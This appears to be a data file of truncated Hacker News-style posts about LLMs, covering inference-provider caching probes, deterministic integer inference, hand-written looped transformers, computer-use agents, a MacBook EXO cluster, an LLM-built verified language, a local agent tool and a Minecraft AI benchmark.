items.text: Kremlinology for LLM Infrastructure Kremlinology was the art of speculating about the inner workings of the Soviet central command headquartered in the Kremlin. Because it was a highly closed and secretive group, its thinking mostly had to be inferred indirectly, filling in the gaps from the downstream results of visible policy actions. When it comes to inference providers in our modern day and age, we find ourselves similarly situated in some ways. We are told that a model is being served at an endpoint, and we can call it and get responses back, but in many ways the inner workings remain a mystery. What hardware is it running on? What optimizations or approximations are being used? In some cases, is a different model being used entirely? Is someone else actually the one serving it? There are ways and means of figuring this out, but to my knowledge they haven't been extensively explored or used in public. For open-weight models, at least, we have a good idea of what serving would or should look like, including under various optimizations. For closed models, there are a fair number of educated guesses we can make about what is going on. We have a number of signals to work with: time to first token (TTFT), fairly detailed inter-token latency (ITL) from streaming responses, logprobs in some cases, API design, cache hits and misses, and usage counters. I looked at these signals on a bunch of inference providers, mostly serving open-weight models on OpenRouter. I used synthetic prompts and public datasets, and for tens of dollars of API spend and lots of analysis was able to learn a lot about how the models were served: which providers are serving the same thing, what you learn from API bugs, what generation speed tells you about speculative decoding, and so on. Caching: the breakpoint tell With full attention a KV cache is just the keys and values of every token. You can resume at any point that is a prefix of the cached prompt. Generally this is done in blocks, though, so you'll have a segment of, say, 16 or 32 tokens where the caching will round to the nearest block. However if you look at Anthropic's API, you'll notice it doesn't allow that. You mark cache breakpoints and have to specifically write the cache. Which raises the question: why does it matter where you might be resuming? The answer, I think, is that Claude uses sliding window attention. In sliding window attention you have some fixed windows of local KV cache associated with attention heads that are local only. What that means is you are able to throw away the KV cache for parts of the prompt where you are not going to resume, and you often want to because it is large: for a hybrid like Qwen3.5-27B, a checkpoint every 512 tokens already costs more cache per token than Llama 3.3-70B. OpenAI's models switched to the same behavior starting with GPT-5.6: they now charge for cache writes and resume only where an earlier request ended. It isn't definitive proof but it's highly suggestive of these models using SWA. Serving choices matter too: in the open-model table below, the same sliding-window model resumes from any prefix at one provider and only from request ends at another. DeepSeek's own API, tested later, reuses any shared prefix in 64-token blocks. Open models, same tests (2026-11-17, 20 trials per endpoint over three runs, witnessed; reports/cache-semantics-open-models-2026-11-17.md) Figures Share of the reusable prefix read from cache, by model and test, grouped by attention type, with hit counts and 95% Wilson intervals: breakpoint-only for Claude and new OpenAI models; any prefix for older OpenAI, DeepSeek and full attention; request ends only for linear hybrids and some sliding-window stacks. Observed prefix-cache hits on Llama 3.3-70B: 16- and 32-token blocks. Cache per token for hybrid models if their state is saved every N tokens. Cache read and write prices as multiples of the input price. How long providers keep your cache This probe is simple. It…

items.title: Eliminating Nondeterminism in LLM Inference with Integer-Only Arithmetic
items.author: nathan-barry
items.text: A while back, Thinking Machines published Defeating Nondeterminism in LLM Inference, which explained why greedy decoding isn’t deterministic in production. In theory, at temperature 0 a model always picks its single most likely next token, so the same prompt gives the same answer every time. In practice, when they sent one prompt 1,000 times, they got 80 different answers.1 The problem is that floating-point addition is not associative. $(a + b) + c$ and $a + (b + c)$ can round differently. A GPU sums thousands of numbers for every token, and the order it sums them in depends on things like how many other requests are in the batch. Change the order, change the rounding, and occasionally change which token wins. Their fix was to pin the order: rewrite the kernels so that a given GPU always adds numbers in the same order, no matter what else is in the batch. That works, but only on that GPU with those kernels. An H100 and an A100 use different matrix-multiply kernels, a CPU uses different instructions entirely, and each one rounds its own way. Run the same model on all three and you still get three different answers. I always wondered, what if we just didn’t use floats? Integer addition is exact, so the order can’t matter. If every operation in the model used integers, the output should be bit-identical everywhere: any batch size, any GPU, any CPU, any vendor. Eventually I found time to work on this during a SpaceXAI hackathon. The project, DetLLM, worked well enough to become a paper at two NeurIPS 2026 workshops.2 In this post I’ll walk through why LLM inference is nondeterministic, why integers fix it, and how to run every part of an LLM (matmuls, softmax, normalization, rotary embeddings) without a single floating-point operation. The animation above is the whole result. The same prompt runs in nine configurations across three machines; the fp16 runs drift apart from the first token, and at step 457 one of them forks onto different text. The integer runs never move. Why are GPUs not deterministic?# Every float addition rounds# A floating-point number stores a fixed number of significant digits and a separate exponent. When you add two numbers with very different exponents, the small one has to be shifted to line up with the big one, and the digits that fall off the end are gone. Every addition rounds. The consequence is that $(a + b) + c$ is not always equal to $a + (b + c)$: >>> (0.1 + 1e20) - 1e20 0.0 >>> 0.1 + (1e20 - 1e20) 0.1 An LLM’s forward pass is mostly sums: every matmul, softmax, and layer norm adds up long lists of numbers, rounding at each step. The order of those additions is up to the kernel. Below, the same eight fp32 values are summed two ways: left to right, and as two halves combined (what a “split-K” matmul kernel does).3 Why kernels don’t always add in the same order# The natural guess is that GPU threads finish in a random order, so the sum lands in a random order. That can happen with atomic adds, but it’s mostly not what goes on in an LLM forward pass. Run the same matmul on the same inputs a thousand times and you get the same bits a thousand times. Most inference kernels are run-to-run deterministic. What they aren’t is batch invariant. cuBLAS doesn’t have one matmul kernel; it has a catalog, and it picks one based on the problem’s shape. A small batch can’t keep every streaming multiprocessor busy, so the library splits the reduction into chunks and sums them separately. A big batch has enough rows to go around, so each row is reduced in one pass. Your row is the same either way. The order it gets added in is not. On a serving endpoint, batch size depends on how many other people are sending requests at that moment. So your output depends on traffic you can’t see or control. Batch size isn’t the only cause, either. Prefill processes your whole prompt in one big matmul while decode handles one token at a time, so the same tokens go through different kernels. And if the KV cache is split into…

items.title: Looped Weight-Space Programming: LLM-Written Transformers
items.author: ahmedheaklwsp
items.text: Deep learning models normally get their weights from training. Once a transformer is trained, though, it is nothing more than a program written in matrices. If you know the program you want, you can skip training and write the matrices yourself. People have done this by hand for small problems (related work). Compilers such as Tracr go further, turning short programs into transformer weights automatically. Recently, Weight-Space Programming (Takehi, Teoh, Zhang and Khattab, MIT CSAIL) showed that a frontier LLM can edit a model's weights directly, without any training, and Fan et al. then had an open model rewrite its weights to fix its mistakes. Other groups have gone further and had LLMs set every weight of a tiny transformer, but only for toy tasks (Singh, AdderBoard). In those transformers, every step of a computation takes a separate block. Scaling one up to a hard problem would mean a far bigger transformer and a far bigger Claude bill, since Claude would have to write every one of those extra weights. We wanted to know whether LLM-written weights hold up on problems that need long chains of reasoning. Our main test is Maze-Hard, a benchmark of 30×30 mazes whose shortest paths run longer than 110 steps. Frontier LLMs struggle with it. For example, when Claude Opus 5.5 is asked for the shortest path, it solves only 26% of the test mazes it is given [1]. So instead of asking Claude to solve the mazes, we asked it to write a looped transformer that solves them, setting every weight by hand. The transformer has a single block with 19,936 weights. This block runs in a loop. Each forward pass moves a shortest-path search one step further, so the transformer keeps feeding the maze back through the same block until the path is complete. With enough passes, it solves 100% of the test mazes. That is more than the newest looped models trained for this benchmark reach. Energy-Based Reasoners (EBR) [2], one of the strongest of them, trains 1.8 million weights on 1,160 PFLOPs of compute and solves 94.1%. That loop is what this post adds to earlier work on writing weights. With it, one block can run thousands to millions of steps, so the number of weights does not grow with problem size. We call this approach looped weight-space programming. Claude itself struggles to carry out a search of more than a hundred steps in text, even when we spell the algorithm out (section 3). Yet it can write a single step of that search into weights, leaving the loop to repeat the step for as long as the maze requires. Programmers rely on the same trick whenever they write code for arithmetic they could not do in their heads. Language models gain from it too. On math word problems, they get more answers right when they write a short program that does the arithmetic than when they do the arithmetic in text [3, 4]. Writing the weights by hand also makes the transformer easy to read. A trained model spreads its algorithm across millions of numbers, so recovering that algorithm takes substantial analysis. A whole study was needed, for example, to show that a small transformer trained on modular addition computes it with sines, cosines and trigonometric identities [5]. The constructed transformer has explicitly assigned state variables and operations. Claude decided what every number inside it stands for before it set a single weight, so we can read those numbers after any loop and watch the search spread across the maze (section 6). The goal is not just to replace conventional algorithms with transformers. It is to understand whether algorithmic reasoning can be explicitly programmed into neural networks rather than acquired through gradient-based training. This gives us interpretable solutions to difficult reasoning tasks, helps separate optimization failures from architectural limitations, and opens the possibility of combining learned representations with reliable algorithmic computation. We hope these hand-written transformers help advance research on…

items.title: How should an LLM see a computer?
items.author: dakshgupta
items.text: Introduction Claude Code and Codex can both use your computer. Under the hood they work in a similar manner: both can give the model a screenshot and an accessibility tree, a text description of every button on screen, and let it click by position or by naming an element. The text version of the screen was built decades ago, for people who couldn’t see it. In 1984, two IBM mathematicians, Jim Thatcher and his former thesis adviser, Jesse Wright, who was blind, started a side project to read the PC’s screen out loud. When GUIs turned the screen into pixels, apps had to start describing themselves instead. Microsoft shipped Active Accessibility in 1997, Sun started AT-SPI for Linux in 2001, and Apple added its Accessibility API in 2002. This text has been useful for agents too. Models looking only at screenshots completed about one task in twenty on the 2024 OSWorld benchmark, whereas most models reading the screen as text performed better. How do those results hold up with stronger models? We tested screenshots on their own and with the accessibility tree on seven models, and used the results to decide how our QA agent, TREX, should see the screen. What's so hard about clicking a button? A person clicks a button by moving the mouse to it. A model, on the other hand, looks at a screenshot and has to write the coordinates out as text (e.g., ‘x=523, y=217’) before clicking on it. Getting these numbers off by a few pixels can mean it clicks the wrong thing. The same button sits at different coordinates on different screen and window sizes, so the guesses get worse when the resolution changes. Also, the model’s vision works against it as it doesn’t see a screenshot pixel by pixel. The image is initially shrunk to fit the model's size limit, then cut into tiny squares, each dozens of pixels wide. But a click still has to land on one exact pixel. Small targets are hard. On ScreenSpot-Pro, a 2025 benchmark with tiny targets on high resolution screens, the best model at release hit the right target only 18.9% of the time. Anthropic’s own docs warn that Claude “might make mistakes or hallucinate when outputting specific coordinates.” When OSWorld came out in 2024, human testers were able to complete 72% of its tasks, and the best model about 12%. The authors found that models struggled with two things: turning ‘click Save’ into the right point on the screen, and knowing how to operate the software. The first problem has a seemingly obvious fix. The accessibility tree already reveals each button's location, so the model doesn't have to go through the trouble of finding pixels. Go one step further, and the model doesn’t even need coordinates; it can pick a button by ID and let the harness click it. To test this, we built three setups, each building upon the last: - Screenshots alone - Adding an accessibility tree (clicking by coordinates) - Adding clicks by element IDs Every setup used the same agent on 172 OSWorld tasks, with one attempt per task, a 50-step limit and low reasoning effort, scored by OSWorld’s own graders. Starting with screenshots The model runs in a loop where it first sees a screenshot and past actions, picks an action (click coordinates, type or press keys), and then looks at the changes. It’s the simplest way to give a model a computer, and the one most agents start with. OSWorld’s baseline agent supports it, and Anthropic described its first computer use model as looking at screenshots and counting how many pixels to move the cursor. We ran the same screenshot agent across seven OpenAI models: On our 172 tasks, GPT-4.1 scored a mere 5.4% with screenshots alone, while the more recent GPT-6.1 Sol scored 83.8%. On the much harder OSWorld 2.0 offline set, OpenAI reports a score of 71.4% for GPT-6.1 Sol at maximum reasoning effort. The gap between the two models raised questions: do stronger models even need the tree, and can it help weaker ones catch up? Adding the accessibility tree Here, the model sees the screenshot…

items.title: LLM Programming and Theory Building
items.author: surprisetalk
items.text: Last newsletter I was unhappy with my Tasktron workflow harness: The explicit state machine and reified effect design worked, but it obscured the core workflow, the harness’s raison d'être. I embarked on a rewrite, hoping to find a more concise and self-evident design based on durable effects (memoized steps) instead — something that would let the code express the intended behavior directly (“Do X, then do Y, then Z”) while being robust to crashes and transparently replayable. However, multiple weeks of attempts with Astra 6, Opus 5.5, and the newly released Sol 6.1 brought me no closer to the improved design I felt certain could exist. Despite my best efforts and instruction, I couldn’t get the models to emit tight, concise code; instead, they kept: This got me thinking about the two very different things I want from programming. The first thing is, well, just a program — something I run which does a straightforward task for me. Vibe-coding with LLMs has been great for these; I’m sure the models get up to all the nonsense I just mentioned, but it doesn’t matter to me — I’m not reading the code, I just want to dictate to my computer instead of typing, export from Photos.app, flash microcontrollers over the network, or a gazillion other things I haven’t bothered to publish because it’s hyper-specific software like mapping MIDI dials to my speaker volume and monitor brightness. I imagine this is what most people want from LLMs (and computers more broadly): Just solve some problem without making me care about the details. However, the second thing I want from programming is, just sometimes, to care about the details. I want a precise language and semantics to model something; to build up a theory. Sure, that theory should be useful for solving the immediate problem — but after that it’s also useful for thinking new thoughts. For example, after I gave up on coding agents and started writing/refactoring Tasktron myself, I realized that instead of thinking in terms of “Tasks” with “Subtasks” that each yield a commit, I could instead think of the system as managing units of “Work”, each having a set of instructions, possible dependencies on other Work, and a target branch that it should be committed to. Formalizing this new concept of Work enables both simpler core machinery (no need for it to distinguish tasks/subtasks) and an entirely new workflow — in addition to the upfront-planning workflow where a Task is defined and then decomposed into subtasks, the harness could also support one-off bits of work. E.g., after reviewing a complex GUI, I could dispatch a few one-offs like “Adjust the background color here”, “Move the popup over here”, “Put this bit in a sidebar” and have the harness execute all of those in parallel on different worktrees and serialize the three resulting commits on a branch. This concept and the additional functionality it unlocked isn’t something I discovered in my week of prompting agents; it only came once I started digging in more myself. That theories are useful, but can be built only with deliberate mental effort isn’t exactly a new take; Peter Naur discussed Programming As Theory Building 40 years ago: [P]rogramming properly should be regarded as an activity by which the programmers form or achieve a certain kind of insight, a theory, of the matters at hand. This suggestion is in contrast to what appears to be a more common notion, that programming should be regarded as a production of a program and certain other texts. This isn’t specific to programming either, of course. I don’t know any music theory, but I can tell this guy Remaking Kids by MGMT to Learn Why It’s So Good understands that banger of a song way more than I do and can explore musical ideas far beyond anything my plain English prompting could elicit from Suno. Since theories reside in our minds, it follows that we must be mentally engaged to build them. But in my usage of coding agents so far, I’ve struggled to stay deeply engaged in the…

items.title: Six Spare MacBook Airs Ran a Private LLM Before Lunch
items.author: piotrgrudzien
items.text: Six Macs with nothing to do Until recently, six MacBook Airs were our team’s remote development machines. Each one ran a Linux virtual machine full of Docker containers, and we worked inside those containers from our own laptops. Then we moved all of that to Boxes42, the remote development product we build ourselves, and the six Macs had nothing left to do. They ended up on a desk next to mine. Each has an M2 chip and 16 GB of memory. 96 GB and an idea Sixteen gigabytes is not much for a language model, but six of these Macs have 96 GB between them, which is enough for a fairly large one if they can share it. EXO is an open-source tool that splits one model across several Macs, so that each one holds a part of the model and they answer together. I had never tried it, and I wanted to see how it is done. For that the Macs have to be connected, and the fast way to connect Macs is Thunderbolt. A MacBook Air has two Thunderbolt ports, so six of them can be joined in a line, each Mac cabled to the next. That takes five cables. Looking for cables The cables took most of the time. Our office has a drawer full of USB-C cables, and most of them are for charging. They fit the same ports and look much the same as Thunderbolt cables, but they carry little or no data. I found one that worked and connected the first two Macs with it. I decided to get those two running before I went looking for the other four. Handing the setup to Claude I opened Claude Code, which could reach the Macs over SSH, and handed it the setup. It started by shutting down what the Macs still ran from their days as dev machines, which freed most of their memory, and then installed EXO on both. The two Macs then ignored each other. Each one decided it was a cluster of one, and nothing said why. Claude went through EXO’s documentation and found the cause in macOS. A privacy setting decides which apps may talk to other devices on the local network, and it was blocking EXO without showing any error. Running EXO as a root system service got around it, and the two Macs found each other within seconds. At 13:12 the two Macs answered together for the first time, with a small model split in half between them. One of Claude’s test questions asked for a haiku about two laptops joined by a cable: Connected in sync Laptops merge as one device Cord holds them as one Four more cables Then it was back to the drawer for four more. Once they were plugged in, two of the five links did not work. Macs 5 and 6 saw each other only as plain USB devices. A MacBook asks “Allow accessory to connect?” when something new is plugged in, and nobody had clicked Allow, because nobody uses these laptops anymore. I walked over and clicked it. The link between Macs 4 and 5 showed a cable plugged in and no data at all. Claude compared it with the links that worked and concluded that a charging cable had made it past me. I swapped it. Claude could see both problems from inside the Macs, and I fixed them by hand. One download instead of six The model for all six Macs was Qwen3-30B-A3B, which takes about 16 GB. That is too big for any one of these laptops, which was the point. EXO has every Mac download the whole model, even though each one uses only a sixth of it. Claude suggested downloading it once and copying it to the others over the cables, and I said no and let EXO do it its own way. Twenty minutes later one Mac had the whole model, the others were still downloading over the office Wi-Fi, and the slowest had 80–90 minutes to go. I asked Claude to do what it had suggested. Copying the model from that one Mac to the other five over Thunderbolt took about 30 seconds. Before lunch At 13:54 the model answered from all six Macs, each one holding a sixth of it. Claude’s test asked for a haiku about six laptops joined in a line by cables: Six laptops line up, Cables weave a digital thread Silent, shared thought. It wrote about 20 tokens a second, faster than I can read, and it listed the first 40 prime…

items.title: Millipede: A small language made by LLMs to help LLMs resist LLMs
items.author: motownphilly
items.text: Most of this repo is written by an LLM. If this offends, close the tab and move on. This readme is written by a human. This is an experiment in trying to answer the question "what should programming languages look like in the LLM era?" Meaning: a time when LLMs are the target program-writing audience, and also the threat model, and also the language implementers. Some characteristics: - Low level, imperative, linear typed with borrows, no panic or UB - Lots of extra fiddly typing disciplines - Finite time & space bounds, no heap - Interface/implementation split, with contracts and specs - Typestates, session types, unit checking, information flow control, etc. etc. - Implemented as a deep embedded DSL in Lean 4 - Each definition elaborated to a Core term and a related Lean function (and some other stuff) - Core term denotation then auto-proved extensionally equal to Lean function - Lean used for specifying and proving correctness properties of either object (vcgen, grind, etc.) - Lean used for anything higher order or polymorphic - Core term used for the algorithmic, monomorphic inner programs - Proofs about space, time, linearity etc. use Core term - Core term compiled independently of normal Lean compilation path - Verified compilation through a sequence of lowerings with memory refinement and forward simulation proofs relating each layer's semantics. The compiler is written as a Lean function from Core terms to loadable OS object-file bytes: no LLVM or host toolchains are involved. I cannot say with high confidence how close to reality any of the above characteristics are. This repo wasn't just written by an LLM to save time, but also because I literally couldn't have written it myself. Most of the theorems much less proofs are over my head. I'm trying to understand what is here, and part of this exploration is the question of how to relate to work I'm guiding while not fully understanding what it's doing. I expect this phenomenon to get worse. I did do the following with the LLM: - Asked for, and discussed the implementation of, all of the above characteristics. - Had it do random differential testing between several pairs: - Core term translations and the Lean functions. - Executions and the computed cost models. - The machine environment model and qemu emulator / host machine states. - Had it do mutation testing at each stage of the lowering. - Had it do rounds of skeptical self-review and criticism about proof style, content, vacuity and triviality, etc. from the perspective of a person who believes LLMs only produce useless lies. - Read a decent portion of the output for a couple days to convince myself it wasn't all lies. I know all this has the distinct smell of writing "don't make mistakes" in the prompt, and for that I apologize. It is truly unclear to me how to do QA on something I substantially don't understand. I am trying my best. I am not providing this as a suggestion for anyone to rush out and use (it's slow and generates bad code) or even necessarily spend any of their precious time on earth trying to review for correctness. I will keep doing that part myself. I offer it more as a sketch, perhaps a provocation to other PL people who know this landscape better than me to try something similar but better, and mainly just a concrete answer to a question I keep getting asked. - Design docs: doc/design/README.md - Codebase & theorem tour: doc/guide/tour.md - Status of work and claims: doc/status.md - Roadmap: doc/roadmap.md - Language surface reference: doc/reference/surface.md - Language tutorial: doc/guide/tutorial.md Note: the tutorial is messy, and the worked example quite trivial. The language is mostly meaningful in terms of its restrictions and missing features; there's nothing exciting about it from an expressivity perspective. I wouldn't bother reading it unless you're morbidly curious, it reads mostly like Lean do-notation with some Rust-isms thrown in. Humans aren't the target audience for writing…

items.title: Show HN: Make small local LLMs reliable agents by moving planning into code
items.author: ikaushik817
items.text: Local AI Tool Engine L.A.T.E. takes a local model (or an API model) and turns it into an agent. You give it a goal, and it works through it: it picks a tool, runs it, reads what came back, and keeps going until the job is done. Search the web, read pages and files, do exact maths, save files, remember things between chats. I built it because models on their own are bad at the boring parts. They get maths wrong, forget everything when the chat ends, and make things up instead of looking them up. Small models are worse: they skip steps, count letters in their head and lose track halfway through a job. So here the tools do the exact work, plain code handles the order of the steps, and the model mostly writes the answer. It runs with Ollama, LM Studio, or an API key (Groq, OpenAI, OpenRouter, Gemini, anything OpenAI-compatible). No LangChain, no paid API needed, two dependencies. - Exact answers. Maths, dates, unit conversion, counting, random numbers and weather come from real tools, not from the model's memory. - Multi-step jobs. "Create a file, read it back, count the characters, save the count, read that file too" runs as exact steps, in order, and the answer lists what really happened. Works even when the model is tiny. - Research with sources. It searches, opens the best pages, answers from what it read, and links them. - Your files. Read a file, search a folder, copy, merge, sort the lines, change case, append text. - Memory. Tell it something once, it remembers in later chats. forget really removes it. - Saving files. Only after you say yes, and only into an ai-output folder. - Terminal or browser. A terminal chat, or a small web page on your own computer. - Rules first, model last. The plan for a job is made by plain code (the same words give the same plan every time). The model only writes text. A job is never answered with "here's how you could do it": it runs, or it says plainly that it couldn't. - It says what really happened. The answer lists the steps that ran and what the tools returned. If a step failed it says "Partly done" or "I stopped at step N because...". If the last check found a difference it says "NOT a success". It never says "Done" for work that wasn't done. You need Node.js 18 or newer (I use 22). Then, in the project folder, one command: npm start That's all. The first time it: - installs what it needs (a minute, one time, you never type npm install), - finds your model: Ollama or LM Studio if one is running (it can even download a small model for you), or you choose "API key" and pick OpenAI, Groq, OpenRouter, Gemini (or any OpenAI-compatible URL) and paste the key. It checks the key and lists the models, - asks if you want PDF reading (adds one small library, about 1 MB), - sends a test message, and opens the chat. After that, npm start just opens the chat. If an update brings a new library, it installs it by itself on the next start. Prefer a browser? npm run ui and open the address it prints. Change the model later: npm run setup. Type exit to quit. npm test runs the tests (no model needed). npm run eval tests how good your model is (see below). No wizard? Set the variables yourself, e.g. AI_PROVIDER=lmstudio npm start (PowerShell: $env:AI_PROVIDER="lmstudio" first). You don't need /agent for these. If one sentence asks for several things, L.A.T.E. splits it into steps by itself. Some examples that work: Create a file called test.txt with "hello123", read it back, count the characters, save the count to result.txt, then read result.txt. Remember that my favorite number is 777, tell me the number, forget it, then tell me the number again. Create 5 text files. Each file should contain a unique random number. Then search all files and tell me which file contains the largest number. Read notes.txt, sort the lines, then save it to sorted.txt Merge a.txt, b.txt and c.txt into all.txt Convert 10 km to miles, then save it to d.txt Create a.txt with HELLO, create b.txt with WORLD, read both files, save…

items.author: jamest
items.text: Hi HN - This is James and Kemal. In past lives we led Firebase and Tensorflow/JAX respectively. HN has been a particularly big part of my (James’) career and the trajectory I’ve taken would be meaningfully different without it. Thank you! Our team shipped a benchmark: KradleBench. We test AI in Minecraft Worlds. 1. The worlds are multi-agent. Humans and other AIs are in there too, often pursuing their own goals. Collaboration and conflict skills fall out of this property. 2. The world are dynamic. They constantly change, which means that agents need to react. “Capture the Flag” has a single winning condition, and many different ways to achieve it. This leads to many emergent and creative strategies. 3. The worlds are real-time. They are not turn-based, they do not wait for AIs to finish thinking. Nature balanced speed and intelligence in humans, we can understand this in AIs too. Underneath all this is Kradle, a platform to test and understand intelligence. It’s a petri dish where any intelligence type (LLM, World Model, Human) can be compared and generate useful information to improve current systems, whether it’s on capabilities or safety. Some findings so far: - A skilled human was #1, until yesterday when Astra 6.2 surpassed them. We lose badly on solo tasks and out-compete on multi-agent ones - Astra 6.2 iterates on its strategy 4x faster than Fable 5.2. The Claude family tends to think hard and stick with strategies. The OpenAI models tend to be more reactive and iterative, which serves them well in multi-agent, dynamic, real-time evals. We’ve got videos on all the top model’s page, and we’ll be producing them when a new model launches. Sign up on the site to get them and for when the platform opens. Thanks for reading, James & Kemal
